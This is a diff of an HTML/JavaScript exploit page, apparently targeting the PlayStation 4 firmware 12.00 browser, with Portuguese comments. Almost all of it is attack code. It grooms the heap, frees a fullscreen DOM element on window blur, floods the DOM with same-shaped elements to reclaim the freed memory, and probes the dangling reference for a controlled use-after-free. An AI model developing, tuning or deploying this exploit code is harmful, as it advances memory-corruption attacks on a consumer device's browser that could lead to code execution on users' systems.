@@ -2,137 +2,188 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF Aggressive Reclaim (Critical Window Flood)</title>
+<title>PS4 12.00 - UAF Precise Reclaim</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
+<h2>PS4 12.00 - UAF Precise Reclaim (Aligned)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
+// ==========================
+// 🔒 LOG SEGURO
+// ==========================
 let logBuffer = [];
 
-function log(m){
-    try{console.log(m);}catch(e){}
-    logBuffer.push(m);
+function log(msg) {
+    try { console.log(msg); } catch(e){}
+    logBuffer.push(msg);
 }
 
 // ==========================
-function setupHeap(){
-    let a=[];
-    for(let i=0;i<5000;i++){
-        let x=new Float64Array(8);
-        a.push(x);
+// HEAP SETUP (INALTERADO)
+// ==========================
+function setupHeap() {
+    let controllers = [];
+
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
     }
+
+    return controllers;
 }
 
 // ==========================
-function setupFS(){
-    let fs=document.createElement("div");
+// FULLSCREEN (INALTERADO)
+// ==========================
+function setupFullscreen() {
+    let fsTarget = document.createElement("div");
 
-    fs.innerHTML="<h1>FULLSCREEN</h1>";
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
 
-    fs.style.cssText="position:absolute;width:100%;height:100%;background:black";
+    fsTarget.style.background = "black";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
 
-    document.body.appendChild(fs);
+    document.body.appendChild(fsTarget);
 
-    fs.webkitRequestFullscreen?.();
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
+    }
 
-    return fs;
+    return fsTarget;
 }
 
 // ==========================
-// 💣 RECLAIM (LOOP CONTÍNUO)
+// 💣 PRECISE MONOTYPE RECLAIM
 // ==========================
-function reclaimBurst(durationMs){
+function preciseReclaim() {
+    log("[*] Precise reclaim iniciado");
 
-    let start = Date.now();
+    let bucket = [];
 
-    function loop(){
+    // 🔹 Fase 1 — churn controlado
+    for (let i = 0; i < 3000; i++) {
+        let el = document.createElement("div");
+        document.body.appendChild(el);
+        el.remove();
+    }
 
-        if(Date.now() - start > durationMs) return;
+    // 🔹 Fase 2 — REUSE DIRECIONADO (estrutura idêntica)
+    for (let i = 0; i < 12000; i++) {
+        let el = document.createElement("div");
 
-        for(let i=0;i<2000;i++){
+        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";
 
-            let e=document.createElement("div");
-            e.innerHTML="CTRL_"+i+"_4141";
-            document.body.appendChild(e);
+        el.style.background = "black";
+        el.style.width = "100%";
+        el.style.height = "100%";
+        el.style.position = "absolute";
+        el.style.top = "0";
+        el.style.left = "0";
 
-            let t=document.createTextNode("TXT_"+i);
-            document.body.appendChild(t);
+        document.body.appendChild(el);
+        bucket.push(el);
+    }
+
+    // 🔹 Fase 3 — churn final leve
+    for (let i = 0; i < 2000; i++) {
+        let el = document.createElement("div");
+        document.body.appendChild(el);
+        el.remove();
+    }
+
+    log("[*] Precise reclaim finalizado: " + bucket.length);
+    return bucket;
+}
+
+// ==========================
+// 🔬 DETECÇÃO
+// ==========================
+function checkUAF(fsTarget) {
+    log("---- CHECK UAF ----");
+
+    try {
+        let html = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = " + html);
+
+        if (html && html.includes("CONTROL_")) {
+            log("[!!!] UAF CONTROLADO (MATCH PERFEITO)");
         }
 
-        // 🔥 roda novamente IMEDIATO
-        setTimeout(loop, 0);
+    } catch(e) {
+        log("[UAF] innerHTML erro");
     }
 
-    loop();
-}
-
-// ==========================
-// PROBE
-// ==========================
-function probe(fs){
-
-    log("---- PROBE ----");
-
-    try{
-        let v = fs.innerHTML;
-
-        log("[LEN] "+(v ? v.length : "null"));
-        log("[VAL] "+v);
-
-        if(v){
-
-            if(v.includes("4141"))
-                log("[!!!] CONTROLLED HIT");
-
-            if(v.length <= 2)
-                log("[!!!] STRING CORROMPIDA");
-
-        }
-
-    }catch(e){
-        log("[CRASH]");
+    try {
+        let node = fsTarget.firstChild;
+        log("[CHECK] firstChild = " + node);
+    } catch(e) {
+        log("[UAF] firstChild erro");
     }
 }
 
 // ==========================
-function trigger(fs){
-
+// TRIGGER (INALTERADO)
+// ==========================
+function trigger(fsTarget) {
     log("[*] Trigger");
 
-    try{
-        fs.remove();
-        document.webkitExitFullscreen?.();
-    }catch(e){}
+    try {
+        fsTarget.remove();
 
-    // 💣 janela crítica REAL
-    reclaimBurst(300); // 🔥 300ms flood
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
+            document.webkitExitFullscreen?.();
+        }
 
-    setTimeout(()=>probe(fs),150);
-    setTimeout(()=>probe(fs),250);
-    setTimeout(()=>probe(fs),350);
+    } catch(e) {
+        log("[ERRO]");
+    }
 
-    setTimeout(()=>{
+    // 🔥 janelas críticas (mantidas + ajuste fino)
+    setTimeout(() => preciseReclaim(), 0);
+    setTimeout(() => preciseReclaim(), 50);
+    setTimeout(() => preciseReclaim(), 100);
+    setTimeout(() => preciseReclaim(), 150); // 🔥 NOVO
+
+    // 🔬 checks
+    setTimeout(() => checkUAF(fsTarget), 10);
+    setTimeout(() => checkUAF(fsTarget), 30);
+    setTimeout(() => checkUAF(fsTarget), 60);
+    setTimeout(() => checkUAF(fsTarget), 120);
+    setTimeout(() => checkUAF(fsTarget), 250);
+
+    // 🔒 dump seguro
+    setTimeout(() => {
         alert(logBuffer.join("\n"));
-    },400);
+    }, 400);
 
-    setTimeout(()=>location.reload(),600);
+    // 🔁 comportamento original
+    setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
-function runTest(){
+// MAIN (INALTERADO)
+// ==========================
+function runTest() {
+    log("[*] Iniciando teste");
 
-    log("[*] Start");
+    let controllers = setupHeap();
+    let fsTarget = setupFullscreen();
 
-    setupHeap();
-
-    let fs = setupFS();
-
-    window.onblur = ()=>{
+    window.onblur = function() {
         log("[*] onblur");
-        setTimeout(()=>trigger(fs),3000);
+
+        // ⚠️ timing crítico intacto
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
 
